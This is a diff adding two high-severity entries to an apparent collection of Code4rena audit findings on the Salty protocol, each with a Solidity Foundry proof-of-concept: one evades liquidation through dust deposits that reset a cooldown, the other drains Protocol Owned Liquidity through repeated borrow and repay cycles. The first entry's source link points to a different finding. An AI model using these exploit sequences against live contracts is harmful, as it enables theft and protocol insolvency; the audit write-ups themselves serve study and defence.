@@ -123,3 +123,109 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
     </details>
+
+## 3.[High] User can evade liquidation by depositing the minimum of tokens and gain time to not be liquidated
+
+### Liquidation by manipulating the user.cooldownExpiration variable
+
+- Summary: The CollateralAndLiquidity contract has a critical vulnerability that lets a user avoid liquidation by manipulating the user.cooldownExpiration variable. By depositing small amounts of tokens, users can increment the cooldownExpiration, causing liquidation attempts to fail. This could lead to system debt if liquidations are avoided.
+
+- Impact & Recommendation: Consider modifying the liquidation function
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#m-05-absence-of-autonomous-mechanism-for-selling-collateral-assets-in-the-external-market-in-exchange-for-usds-will-cause-undercollateralization-during-market-crashes-and-will-cause-usds-to-depeg) & [Report](https://code4rena.com/reports/2024-01-salty)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+  // Filename: src/stable/tests/CollateralAndLiquidity.t.sol:TestCollateral
+  // $ forge test --match-test "testUserLiquidationMayBeAvoided" --rpc-url https://yoururl -vv
+  //
+    function testUserLiquidationMayBeAvoided() public {
+        // Liquidatable user can avoid liquidation
+        //
+        // Have bob deposit so alice can withdraw everything without DUST reserves restriction
+        _depositHalfCollateralAndBorrowMax(bob);
+        //
+        // 1. Alice deposit and borrow the max amount
+        // Deposit and borrow for Alice
+        _depositHalfCollateralAndBorrowMax(alice);
+        // Check if Alice has a position
+        assertTrue(_userHasCollateral(alice));
+        //
+        // 2. Crash the collateral price
+        _crashCollateralPrice();
+        vm.warp( block.timestamp + 1 days );
+        //
+        // 3. Alice maliciously front run the liquidation action and deposit a DUST amount
+        vm.prank(alice);
+        collateralAndLiquidity.depositCollateralAndIncreaseShare(PoolUtils.DUST + 1, PoolUtils.DUST + 1, 0, block.timestamp, false );
+        //
+        // 4. The function alice liquidation will be reverted by "Must wait for the cooldown to expire"
+        vm.expectRevert( "Must wait for the cooldown to expire" );
+        collateralAndLiquidity.liquidateUser(alice);
+    }
+
+  ```
+
+  </details>
+
+## 4.[High] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS
+
+### Bad debt from liquidations
+
+- Summary: The Liquidizer contract burns USDS collected from users' repayments during upkeep. If there's enough USDS, it's directly burned; otherwise, Protocol Owned Liquidity (POL) is converted to USDS to cover the deficit. However, the usdsThatShouldBeBurned variable is continuously increased without increasing the Liquidizer balance, forcing it to sell POL to cover the increase. If POL is exhausted, the protocol can't cover bad debt from liquidations, negatively impacting the USDS price.
+
+- Impact & Recommendation: An attacker can exploit this by borrowing and repaying multiple times to exhaust POL or gradually over time as users repay their USDS. Therefore consider to Send the repaid USDS to the Liquidizer.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#h-06-when-borrowers-repay-usds-it-is-sent-to-the-wrong-address-allowing-anyone-to-burn-protocol-owned-liquidity-and-build-bad-debt-for-usds) & [Report](https://code4rena.com/reports/2024-01-salty)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+
+      function testBurnPOL() public {
+        // setup
+        vm.prank(address(collateralAndLiquidity));
+  	usds.mintTo(address(dao), 20000 ether);
+  	vm.prank(address(teamVestingWallet));
+  	salt.transfer(address(dao), 10000 ether);
+  	vm.prank(DEPLOYER);
+  	dai.transfer(address(dao), 10000 ether);
+        // create Protocol Owned Liquidity (POL)
+        vm.startPrank(address(dao));
+  	collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
+  	collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
+  	vm.stopPrank();
+        bytes32 poolIDA = PoolUtils._poolID(salt, usds);
+  	bytes32 poolIDB = PoolUtils._poolID(dai, usds);
+  	assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDA), 20000 ether);
+  	assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDB), 20000 ether);
+        // Alice deposits collateral
+        vm.startPrank(address(alice));
+        wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
+        weth.approve(address(collateralAndLiquidity), type(uint256).max);
+        collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice), weth.balanceOf(alice), 0, block.timestamp, true );
+
+        // Alice performs multiple borrows and repayments, increasing the
+        // usdsThatShouldBeBurned variable in Liquidizer
+        for (uint i; i < 100; i++){
+            vm.startPrank(alice);
+            uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
+  	    collateralAndLiquidity.borrowUSDS( maxUSDS );
+            uint256 borrowed = collateralAndLiquidity.usdsBorrowedByUsers(alice);
+            collateralAndLiquidity.repayUSDS(borrowed);
+        }
+
+        vm.startPrank(address(upkeep));
+        // perform upkeep multiple times to cover bad debt
+        // breaks when POL is exhausted
+        for(;;){
+            (, uint reserve1) = pools.getPoolReserves(dai, usds);
+            if(reserve1 * 99 / 100 < 100) break;
+            liquidizer.performUpkeep();
+        }
+        assertGt(liquidizer.usdsThatShouldBeBurned(), usds.balanceOf(address(liquidizer)));
+    }
+
+
+  ```
+
+  </details>
